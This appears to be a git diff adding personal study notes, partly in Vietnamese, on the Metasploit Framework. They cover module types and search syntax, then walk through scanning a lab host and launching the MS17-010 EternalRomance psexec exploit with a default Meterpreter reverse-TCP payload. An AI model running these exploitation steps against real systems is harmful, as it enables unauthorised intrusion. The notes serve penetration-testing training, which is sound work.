@@ -1,7 +1,334 @@
 metasploit 
 
-/////////////////////////////////////////////////////////////////////
 
+/usr/share/metasploit-framewok
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Tìm hiểu sơ qua về metasploit 
+
+Metasploit Pro : commercial use , paid Subscription, Enterprise 
+
+Metasploit Framework : Open source, Community Driven, Free 
+
+Có bao nhiêu module 
+  naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/modules
+    auxiliary  encoders  evasion  exploits  nops  payloads  post
+
+Plguin ? 
+  naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/
+    aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb
+    alias.rb           komand.rb      pcap_log.rb          sqlmap.rb
+    auto_add_route.rb  lab.rb         request.rb           thread.rb
+    beholder.rb        libnotify.rb   rssfeed.rb           token_adduser.rb
+    db_credcollect.rb  msfd.rb        sample.rb            token_hunter.rb
+    db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
+    event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
+    ffautoregen.rb     nexpose.rb     socket_logger.rb
+
+Plugin trong Metasploit là các tiện ích mở rộng bằng Ruby, nạp bằng lệnh load, giúp bổ sung chức năng và tự động hóa trong msfconsole.
+  Ví dụ:
+    nmap → chạy Nmap trực tiếp trong Metasploit, import kết quả.
+    session_tagger → tự động gắn nhãn cho session.
+    event_tagger → log & gắn thẻ sự kiện.
+    log → ghi log hoạt động.
+    👉 Hiểu đơn giản: plugin = “add-on” giúp msfconsole mạnh và tiện hơn.
+
+Script
+  Chức năng Meterpreter và các script hữu ích khác.
+    naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/
+    meterpreter  ps  resource  shell
+
+Tools
+Command-line utilities that can be called directly from the msfconsole menu.
+  naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/tools/
+    context  docs     hardware  modules   payloads
+    dev      exploit  memdump   password  recon
+
+
+
+Make sure you are using the latest version
+  naruto3co@htb[/htb]$ sudo apt update && sudo apt install metasploit-framework
+
+The first steps í to gather information about the target: what it is, which technologies and versions are being used, and whether they have vulnerability . -> we need Enumeration 
+MSF engagement structure 
+
+Engagement Structure
+│
+├── Enumeration
+│   ├── Service Validation
+│   │   ├── Passive Scanning
+│   │   │   ├── OSINT
+│   │   │   ├── Interacting with services legitimately
+│   │   │   └── Whois / DNS records
+│   │   └── Active Scanning
+│   │       ├── nMap / Nessus / NexPose scans
+│   │       ├── Web service identification tools
+│   │       └── Built-with identification tools
+│   └── Vulnerability Research
+│       ├── VulnDB (GUI)
+│       ├── Rapid7 (GUI)
+│       ├── SearchSploit (CLI)
+│       └── Google Dorking (GUI)
+│
+├── Preparation
+│   ├── Code Auditing
+│   ├── Dependency Check
+│   └── Importing Custom Modules
+│
+├── Exploitation
+│   ├── Run Module Locally
+│   ├── Set Parameters
+│   │   ├── Options (> show options)
+│   │   │   ├── URI
+│   │   │   ├── PROXIES
+│   │   │   ├── RHOST / RPORT
+│   │   │   ├── USERNAMES / PASSWORDS
+│   │   │   ├── DICTIONARIES
+│   │   │   └── SESSION
+│   │   ├── Payloads (> show payloads)
+│   │   │   ├── METERPRETER
+│   │   │   ├── SHELL BINDS
+│   │   │   ├── REVERSE SHELLS
+│   │   │   ├── EXE
+│   │   │   ├── LINUX
+│   │   │   ├── WINDOWS
+│   │   │   ├── MACOSX
+│   │   │   └── OTHERS
+│   │   └── Targets (> show targets)
+│   │       └── Set target [OS]
+│   └── Run
+│
+├── Privilege Escalation
+│   ├── Vulnerability Research
+│   ├── Credential Gathering
+│   └── Token Impersonation
+│
+└── Post-Exploitation
+    ├── Pivoting to Other Systems
+    ├── Credential Gathering
+    ├── Data Exfiltration
+    └── Cleanup
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Once we are in the msfconsole, we can select modules available Metasploit. Each of them is structured into folders, which will look like this 
+
+Syntax
+  <No.> <type>/<os>/<service>/<name>
+  794   exploit/windows/ftp/scriptftp_list
+
+How many type of "type" 
+  Auxiliary: Quét (scanning), fuzzing, sniffing và các khả năng quản trị. Cung cấp hỗ trợ và chức năng bổ sung.
+  Encoders: Đảm bảo payload được giữ nguyên vẹn khi tới đích.
+  Exploits: Được định nghĩa là các module khai thác lỗ hổng, cho phép triển khai payload.
+  NOPs: (No Operation code) Giữ cho kích thước payload nhất quán giữa các lần khai thác.
+  Payloads: Đoạn mã chạy từ xa và gọi ngược về máy tấn công để thiết lập kết nối (hoặc shell).
+  Plugins: Các script bổ sung có thể được tích hợp trong quá trình kiểm thử với msfconsole và cùng tồn tại.
+  Post: Nhiều module hỗ trợ thu thập thông tin, mở rộng tấn công (pivot), và các hoạt động hậu khai thác khác.
+
+Hệ điều hành
+  Thẻ Hệ điều hành chỉ định hệ điều hành và kiến trúc mà mô-đun được tạo ra. Tất nhiên, các hệ điều hành khác nhau yêu cầu mã khác nhau để chạy để có được kết quả mong muốn.
+
+Dịch vụ
+  Thẻ Dịch vụ đề cập đến dịch vụ dễ bị tấn công đang chạy trên máy mục tiêu. Đối với một số mô-đun, chẳng hạn như mô-đun phụ trợ hoặc mô-đun sau, thẻ này có thể đề cập đến một hoạt động chung hơn như thu thập, ví dụ như thu thập thông tin đăng nhập.
+
+Tên
+  Cuối cùng, thẻ Tên giải thích hành động thực tế có thể được thực hiện bằng mô-đun này được tạo cho một mục đích cụ thể.
+
+
+
+Searching for Modules
+  msf6 > search eternalromance
+  Matching Modules
+  ================
+  
+     #  Name                                  Disclosure Date  Rank    Check  Description
+     -  ----                                  ---------------  ----    -----  -----------
+     0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+     1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+
+  msf6 > search eternalromance type:exploit
+  Matching Modules
+  ================
+     #  Name                                  Disclosure Date  Rank    Check  Description
+     -  ----                                  ---------------  ----    -----  -----------
+     0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+
+
+Chúng ta cũng có thể làm cho tìm kiếm trở nên tổng quát hơn một chút và thu hẹp nó thành một danh mục dịch vụ. Ví dụ, đối với CVE, chúng ta có thể chỉ định năm (cve:<year>), nền tảng Windows (platform:<os>), loại mô-đun chúng ta muốn tìm (type:<auxiliary/exploit/post>), thứ hạng độ tin cậy (rank:<rank>) và tên tìm kiếm (<pattern>). Điều này sẽ thu hẹp kết quả tìm kiếm xuống chỉ còn những kết quả khớp với tất cả các yếu tố trên.
+
+MSF - Specific Search
+  msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
+  Matching Modules
+  ================
+  
+     #  Name                                            Disclosure Date  Rank       Check  Description
+     -  ----                                            ---------------  ----       -----  -----------
+     0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
+     1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
+     2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE
+
+
+Module Selection
+To select our first module, we first need to find one. Let's suppose that we have a target running a version of SMB vulnerable to EternalRomance (MS17_010) exploits. We have found that SMB server port 445 is open upon scanning the target.
+  naruto3co@htb[/htb]$ nmap -sV 10.10.10.40
+    Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC
+    Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+    Nmap scan report for 10.10.10.40
+    Host is up (0.051s latency).
+    Not shown: 991 closed ports
+    PORT      STATE SERVICE      VERSION
+    135/tcp   open  msrpc        Microsoft Windows RPC
+    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+    445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+    49152/tcp open  msrpc        Microsoft Windows RPC
+    49153/tcp open  msrpc        Microsoft Windows RPC
+    49154/tcp open  msrpc        Microsoft Windows RPC
+    49155/tcp open  msrpc        Microsoft Windows RPC
+    49156/tcp open  msrpc        Microsoft Windows RPC
+    49157/tcp open  msrpc        Microsoft Windows RPC
+    Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds
+
+Lưu ý ở đây là : Port 445 mở, đây là SMB service, thường liên quan đến các lỗ hổng nổi tiếng như MS17-010 (EternalBlue, EternalRomance, EternalChampion, …). => tìm các lỗ hổng liên quan trên msfconsole 
+
+  msf6 > search ms17_010
+  Matching Modules
+  ================
+     #  Name                                      Disclosure Date  Rank     Check  Description
+     -  ----                                      ---------------  ----     -----  -----------
+     0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+     1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+     2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+     3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+
+Tiếp theo, chọn module phù hợp. thấy rằng nmap nhận định đây là windows 7 đến 10 
+
+Sử dụng module
+  msf6 > use 0
+  msf6 exploit(windows/smb/ms17_010_psexec) > options
+  Module options (exploit/windows/smb/ms17_010_psexec): 
+     Name                  Current Setting                          Required  Description
+     ----                  ---------------                          --------  -----------
+     DBGTRACE              false                                    yes       Show extra debug trace info
+     LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
+     NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
+     NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
+                           rdlists/named_pipes.txt
+     RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework
+                                                                              /wiki/Using-Metasploit
+     RPORT                 445                                      yes       The Target port (TCP)
+     SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
+     SERVICE_DISPLAY_NAME                                           no        The service display name
+     SERVICE_NAME                                                   no        The service name
+     SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
+                                                                              rmal read/write folder share
+     SMBDomain             .                                        no        The Windows domain to use for authentication
+     SMBPass                                                        no        The password for the specified username
+     SMBUser                                                        no        The username to authenticate as
+  Payload options (windows/meterpreter/reverse_tcp):
+     Name      Current Setting  Required  Description
+     ----      ---------------  --------  -----------
+     EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+     LHOST                      yes       The listen address (an interface may be specified)
+     LPORT     4444             yes       The listen port
+  Exploit target:
+     Id  Name
+     --  ----
+     0   Automatic
+
+Ta thấy thẻ No. rất helpful , chỉ cần nhập số của nó thay vì nhập tên cả module 
+Chọn module xong rồi thì ta có thể xem thông tin của module đó
+  msf6 exploit(windows/smb/ms17_010_psexec) > info
+         Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+       Module: exploit/windows/smb/ms17_010_psexec
+     Platform: Windows
+         Arch: x86, x64
+   Privileged: No
+      License: Metasploit Framework License (BSD)
+         Rank: Normal
+    Disclosed: 2017-03-14
+  Provided by:
+    sleepya
+    zerosum0x0
+    Shadow Brokers
+    Equation Group
+  Available targets:
+    Id  Name
+    --  ----
+    0   Automatic
+    1   PowerShell
+    2   Native upload
+    3   MOF upload
+  Check supported:
+    Yes
+  Basic options:
+    Name                  Current Setting                          Required  Description
+    ----                  ---------------                          --------  -----------
+    DBGTRACE              false                                    yes       Show extra debug trace info
+    LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
+    NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
+    NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
+                          rdlists/named_pipes.txt
+    RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
+                                                                             wiki/Using-Metasploit
+    RPORT                 445                                      yes       The Target port (TCP)
+    SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
+    SERVICE_DISPLAY_NAME                                           no        The service display name
+    SERVICE_NAME                                                   no        The service name
+    SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor
+                                                                             mal read/write folder share
+    SMBDomain             .                                        no        The Windows domain to use for authentication
+    SMBPass                                                        no        The password for the specified username
+    SMBUser                                                        no        The username to authenticate as
+  Payload information:
+    Space: 3072
+  Description:
+    This module will exploit SMB with vulnerabilities in MS17-010 to 
+    achieve a write-what-where primitive. This will then be used to 
+    overwrite the connection session information with as an 
+    Administrator session. From there, the normal psexec payload code 
+    execution is done. Exploits a type confusion between Transaction and 
+    WriteAndX requests and a race condition in Transaction requests, as 
+    seen in the EternalRomance, EternalChampion, and EternalSynergy 
+    exploits. This exploit chain is more reliable than the EternalBlue 
+    exploit, but requires a named pipe.
+  References:
+    https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
+    https://nvd.nist.gov/vuln/detail/CVE-2017-0143
+    https://nvd.nist.gov/vuln/detail/CVE-2017-0146
+    https://nvd.nist.gov/vuln/detail/CVE-2017-0147
+    https://github.com/worawit/MS17-010
+    https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
+    https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
+  Also known as:
+    ETERNALSYNERGY
+    ETERNALROMANCE
+    ETERNALCHAMPION
+    ETERNALBLUE
+
+Chỗ này quan tâm mỗi basic Option nhé ae. chỗ nào required là YES thì ae cần điền nhé 
+
+Modules
+  msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
+    RHOSTS => 10.10.10.40
+
+  msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
+  RHOSTS => 10.10.10.40
+
+Once everything is set and ready to go, we can proceed to launch the attack. Note that the payload was not set here, as the default one is sufficient for this demonstration.
+
+  msf6 exploit(windows/smb/ms17_010_psexec) > run
+
+Tôi thường dùng msf6 check để kiểm tra trước đó 
+exploit(windows/smb/ms17_010_psexec) > check
+
+
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 Frist time, you need search keyword 
   searchsploit openssh 7.2
 
@@ -28,4 +355,9 @@ But you need to check that to ensure sever is vulnerable
 
 Ok final 
   exploit 
+
+
+
+
+
 
